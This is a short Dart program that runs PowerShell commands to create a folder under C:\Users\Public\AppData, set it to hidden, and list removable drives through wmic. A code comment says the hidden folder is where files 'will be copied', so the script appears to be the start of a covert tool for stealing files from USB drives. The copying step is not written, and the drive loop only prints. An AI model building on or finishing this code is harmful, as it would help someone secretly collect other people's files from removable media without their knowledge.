import "dart:io";
import "dart:convert";

main() {
  Process.run("powershell", [
    "-command",
    "New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\AppData"
  ]); // Create folder where files will be copied.

  Process.run("powershell", [
    "-command",
    "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
  ]); // Set the folder as hidden.

  Process.run(
          'wmic', ['logicaldisk', 'where', 'drivetype=2', 'get', 'DeviceID'])
      .then((result) {
    String output = result.stdout;
    output = output.replaceAll("DeviceID", "").replaceAll(" ", "");

    LineSplitter ls = new LineSplitter();
    List<String> lines = ls.convert(output);
    print(lines);
    String line;
    for (line in lines) {
      if (line == "") {
        //lines.remove(line);
        print(lines);
      } else {
        print(lines);
      }
    }
  });
}
